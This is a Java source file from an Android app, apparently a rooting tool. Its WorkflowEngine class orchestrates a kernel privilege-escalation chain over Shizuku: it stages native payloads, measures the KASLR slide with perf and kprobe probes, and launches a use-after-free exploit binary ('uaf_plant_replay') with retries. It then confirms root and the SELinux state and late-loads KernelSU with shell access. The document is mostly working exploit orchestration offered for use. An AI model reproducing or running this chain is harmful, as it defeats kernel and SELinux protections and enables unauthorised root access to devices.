package com.gkeyes.lhasa26.core;

import android.content.res.AssetManager;

import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Owns the long-running workflow. UI code only receives immutable events and never runs shell work.
 * The supplied native payloads remain opaque assets; orchestration and state handling are our code.
 */
public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
    public enum State { IDLE, RUNNING, ROOTED, KSU_PENDING, COMPLETE, FAILED }

    public static final String[] STEP_LABELS = {
            "校验内核", "等待系统空闲", "部署程序", "测量内核地址",
            "提权执行", "结果验证", "KernelSU 接管"
    };

    private static final Pattern RUNNING_PAYLOAD = Pattern.compile("uaf_plant_replay");
    private final CommandExecutor executor;
    private final AssetDeployer deployer;
    private final WorkflowCallbacks callbacks;
    private final ExecutorService worker = Executors.newSingleThreadExecutor(r -> {
        Thread thread = new Thread(r, "lhasa-workflow");
        thread.setDaemon(true);
        return thread;
    });
    private final Object logLock = new Object();
    private final StringBuilder sessionLog = new StringBuilder();
    private volatile State state = State.IDLE;
    private volatile long startedAt;
    private volatile int currentStep = -1;

    public WorkflowEngine(AssetManager assets, CommandExecutor executor, WorkflowCallbacks callbacks) {
        this.executor = executor;
        this.callbacks = callbacks;
        this.deployer = new AssetDeployer(assets, executor, this);
    }

    public State getState() {
        return state;
    }

    public boolean startRoot() {
        return start("root", this::runRootChain);
    }

    public boolean retryKernelSu() {
        if (state != State.ROOTED && state != State.KSU_PENDING) {
            return false;
        }
        return start("ksu", this::runKernelSuStep);
    }

    public boolean diagnose() {
        return start("diagnose", this::runDiagnosis);
    }

    public void refreshDeviceInfo() {
        worker.execute(() -> {
            if (!executor.isAvailable()) {
                return;
            }
            try {
                DeviceSnapshot snapshot = new DeviceSnapshot(
                        run("getprop ro.product.device", true).output,
                        run("getprop ro.build.version.incremental", true).output,
                        run("uname -r", true).output);
                callbacks.onDevice(snapshot);
            } catch (Exception ignored) {
                // Device information is supplemental and should never block the main action.
            }
        });
    }

    public void stop() {
        worker.shutdownNow();
    }

    public String getSessionLog() {
        synchronized (logLock) {
            return sessionLog.toString();
        }
    }

    @Override
    public void append(String line) {
        if (line == null || line.trim().isEmpty()) {
            return;
        }
        String value = line.endsWith("\n") ? line : line + "\n";
        synchronized (logLock) {
            if (sessionLog.length() < 48000) {
                sessionLog.append(value);
            }
        }
        callbacks.onLog(value);
    }

    @FunctionalInterface
    private interface WorkflowTask {
        void run() throws Exception;
    }

    private boolean start(String operation, WorkflowTask action) {
        synchronized (this) {
            if (state == State.RUNNING) {
                append("正在运行，请勿重复点击。");
                return false;
            }
            if (!executor.isAvailable()) {
                callbacks.onStatus("Shizuku 未运行或尚未授权");
                append("请先启动 Shizuku 并授权本应用。");
                return false;
            }
            state = State.RUNNING;
            startedAt = System.currentTimeMillis();
            currentStep = -1;
            synchronized (logLock) {
                sessionLog.setLength(0);
            }
            callbacks.onState(State.RUNNING, operation);
        }
        worker.execute(() -> {
            try {
                action.run();
            } catch (InterruptedException interrupted) {
                Thread.currentThread().interrupt();
                fail("操作已中断");
            } catch (Throwable failure) {
                append(friendly(failure));
                fail(friendly(failure));
            }
        });
        return true;
    }

    private void runRootChain() throws Exception {
        step(0);
        status("核对内核");
        String kernel = run("uname -r", false).output.trim();
        append("uname -r = " + kernel);
        if (!KernelSupport.isSupported(kernel)) {
            append("（警告）当前内核不在已验证列表，仍继续，风险自负。");
        }
        if (payloadProcessCount() > 0) {
            throw new IllegalStateException("上次运行的进程仍在运行，请重启设备后重试。");
        }

        step(1);
        status("等待系统空闲");
        waitForIdle();

        step(2);
        status("写入程序");
        deployer.stageAll();

        step(3);
        status("测量本次开机的内核地址");
        String addressArgument = measureAddress();

        step(4);
        status("提权执行中，请稍候");
        if (!runPayload(addressArgument)) {
            stopPayload();
            throw new IllegalStateException("提权失败 · 请重启设备");
        }

        step(5);
        status("验证");
        CommandResult verify = run("/data/local/tmp/pc98260-su -c 'id; getenforce; grep CapEff /proc/self/status'", false);
        append(verify.output);
        if (!isRoot(verify.output)) {
            throw new IllegalStateException("rootd 无响应 · 请重启设备");
        }
        state = State.ROOTED;
        callbacks.onState(State.ROOTED, "已获得临时 ROOT");
        append("临时 ROOT 已就绪。");

        runKernelSuStep();
    }

    private void runDiagnosis() throws Exception {
        status("正在诊断");
        deployer.stage("reach_probe");
        CommandResult result = run("/data/local/tmp/reach_probe > /data/local/tmp/diag.log 2>&1", true);
        String report = run("cat /data/local/tmp/diag.log 2>/dev/null", true).output;
        if (report.trim().isEmpty()) {
            report = result.output;
        }
        append(report);
        run("echo '!enable_event:kmem:kmem_cache_alloc' > /sys/kernel/tracing/events/kmem/rss_stat/trigger 2>/dev/null; echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null", true);
        if (report.contains("必需项全部通过")) {
            state = State.IDLE;
            status("诊断通过 · 环境可用");
            callbacks.onState(State.IDLE, "诊断通过");
        } else {
            fail(report.contains("必需接口不可用") ? "诊断失败 · 有必需项未通过" : "诊断未完成 · 详见日志");
        }
    }

    private void runKernelSuStep() {
        try {
            step(6);
            status("已获得临时 ROOT · 正在加载 KernelSU");
            deployer.stage("ksud");
            CommandResult load = run("rm -f /data/local/tmp/ksu_try.log; "
                    + "/data/local/tmp/pc98260-su -c \"cd /data/local/tmp && ./ksud late-load --kmi android17-6.18 --allow-shell --package-name me.weishu.kernelsu\" "
                    + ">> /data/local/tmp/ksu_try.log 2>&1; echo rc=$? >> /data/local/tmp/ksu_try.log; "
                    + "for i in 1 2 3 4 5 6 7 8 9 10; do /system/bin/su -c id >> /data/local/tmp/ksu_try.log 2>&1 && break; sleep 0.3; done", true);
            String log = run("cat /data/local/tmp/ksu_try.log 2>/dev/null", true).output;
            if (log.trim().isEmpty()) {
                log = load.output;
            }
            append(log);
            if (isRoot(log)) {
                state = State.COMPLETE;
                callbacks.onState(State.COMPLETE, "全部完成 · KernelSU 已接管");
            } else {
                state = State.KSU_PENDING;
                callbacks.onState(State.KSU_PENDING, "KernelSU 未接管 · 临时 ROOT 仍有效，可再次尝试");
            }
        } catch (Throwable failure) {
            state = State.KSU_PENDING;
            append(friendly(failure));
            callbacks.onState(State.KSU_PENDING, "KernelSU 未接管 · 临时 ROOT 仍有效，可再次尝试");
        }
    }

    private void waitForIdle() throws Exception {
        long started = System.currentTimeMillis();
        int runnable = -1;
        long freeKb = -1;
        while (System.currentTimeMillis() - started < 20000L) {
            String[] lines = run("cat /proc/loadavg 2>/dev/null; awk '/MemFree/{print $2}' /proc/meminfo 2>/dev/null", true).output.trim().split("\\n");
            if (lines.length > 0) {
                String[] fields = lines[0].trim().split("\\s+");
                if (fields.length >= 4 && fields[3].contains("/")) {
                    try {
                        runnable = Integer.parseInt(fields[3].substring(0, fields[3].indexOf('/')));
                    } catch (NumberFormatException ignored) {
                        runnable = -1;
                    }
                }
            }
            if (lines.length > 1) {
                try {
                    freeKb = Long.parseLong(lines[1].trim());
                } catch (NumberFormatException ignored) {
                    freeKb = -1;
                }
            }
            if (runnable >= 0 && runnable <= 6 && freeKb >= 200000) {
                break;
            }
            Thread.sleep(300L);
        }
        append(String.format(Locale.US, "[空闲] 等待 %.1fs · runnable=%d · MemFree=%d kB", (System.currentTimeMillis() - started) / 1000.0, runnable, freeKb));
    }

    private String measureAddress() throws Exception {
        for (int seconds : new int[]{1, 2}) {
            CommandResult result = run("/data/local/tmp/perf_slide --duration " + seconds, true);
            String output = filterProbe(result.output);
            if (!output.trim().isEmpty()) {
                append(output);
            }
            String slide = KernelSupport.extractSlide(result.output);
            long parsed = KernelSupport.parseHex(slide);
            if (slide != null && KernelSupport.isSlideValid(parsed)) {
                append("slide = " + slide + "（perf " + seconds + "s）");
                return "--slide " + slide;
            }
            if (slide != null) {
                append("slide " + slide + " 越界/未对齐，弃用");
            }
        }
        append("perf_slide 未取到，改用 slide_probe");
        CommandResult probe = run("/data/local/tmp/slide_probe", false);
        append(filterProbe(probe.output));
        String calc = KernelSupport.extractCalc(probe.output);
        if (calc != null) {
            append("slide = " + calc + "（kprobe）");
            return "--slide " + calc;
        }
        String site = KernelSupport.extractSite(probe.output);
        if (site != null) {
            append("site = " + site + "（trace 扫描）");
            return "--site " + site;
        }
        throw new IllegalStateException("未能读取 KASLR 偏移，请确认 perf / tracefs 可用。");
    }

    private boolean runPayload(String addressArgument) throws Exception {
        for (int attempt = 1; attempt <= 3; attempt++) {
            run("rm -f /data/local/tmp/uaf_replay.log; toybox setsid sh -c '/data/local/tmp/uaf_plant_replay "
                    + addressArgument + " > /data/local/tmp/uaf_replay.log 2>&1 < /dev/null' >/dev/null 2>&1 & echo STARTED", true);
            Thread.sleep(1500L);
            for (int poll = 0; poll < 200; poll++) {
                String tail = run("tail -n 24 /data/local/tmp/uaf_replay.log 2>/dev/null", true).output;
                if (!tail.trim().isEmpty()) {
                    callbacks.onTail(tail);
                }
                if (containsSuccessMarker(tail)) {
                    return true;
                }
                if (poll % 5 == 4) {
                    CommandResult verify = run("/data/local/tmp/pc98260-su -c 'id'", true);
                    if (isRoot(verify.output)) {
                        return true;
                    }
                }
                if (containsRetryMarker(tail)) {
                    break;
                }
                Thread.sleep(800L);
            }
            if (attempt < 3) {
                append("[重试] 第 " + attempt + " 次未命中，重启 payload 再试（" + (attempt + 1) + "/3）");
                stopPayload();
                Thread.sleep(1200L);
            }
        }
        return isRoot(run("/data/local/tmp/pc98260-su -c 'id'", true).output);
    }

    private boolean containsSuccessMarker(String tail) {
        return tail.contains("[child-cred] uid=0")
                || tail.contains("[cred] rooted")
                || tail.contains("holding pages")
                || tail.contains("[selinux] already permissive");
    }

    private boolean containsRetryMarker(String tail) {
        return tail.contains("holding zombie")
                || tail.contains("leak failed")
                || tail.contains("[selinux] attempt 2/");
    }

    private void stopPayload() throws Exception {
        run("pkill -f uaf_plant_replay 2>/dev/null; killall uaf_plant_replay 2>/dev/null; true", true);
    }

    private int payloadProcessCount() throws Exception {
        String output = run("ps -A 2>/dev/null | grep -c '[u]af_plant_replay'", true).output.trim();
        try {
            return Integer.parseInt(output);
        } catch (NumberFormatException ignored) {
            Matcher matcher = RUNNING_PAYLOAD.matcher(output);
            return matcher.find() ? 1 : 0;
        }
    }

    private CommandResult run(String command, boolean quiet) throws Exception {
        return executor.run(command, quiet);
    }

    private void step(int value) {
        currentStep = value;
        callbacks.onStep(value, value >= 0 && value < STEP_LABELS.length ? STEP_LABELS[value] : "全部完成");
    }

    private void status(String text) {
        callbacks.onStatus(text);
    }

    private void fail(String message) {
        state = State.FAILED;
        callbacks.onState(State.FAILED, message);
    }

    private static boolean isRoot(String output) {
        return output != null && (output.contains("uid=0(root)") || output.contains("uid=0 "));
    }

    private static String filterProbe(String output) {
        if (output == null) {
            return "";
        }
        StringBuilder filtered = new StringBuilder();
        for (String line : output.split("\\n")) {
            if (!line.startsWith("[slide] cpu") && !line.trim().isEmpty()) {
                filtered.append(line).append('\n');
            }
        }
        return filtered.toString();
    }

    private static String friendly(Throwable error) {
        Throwable current = error;
        while (current.getCause() != null) {
            current = current.getCause();
        }
        String message = current.getMessage();
        if (message == null || message.trim().isEmpty()) {
            message = current.toString();
        }
        if (message.contains("DeadObject") || message.contains("Binder") || message.contains("binder")) {
            return "Shizuku 连接已断开，请重新启动 Shizuku";
        }
        return message;
    }
}
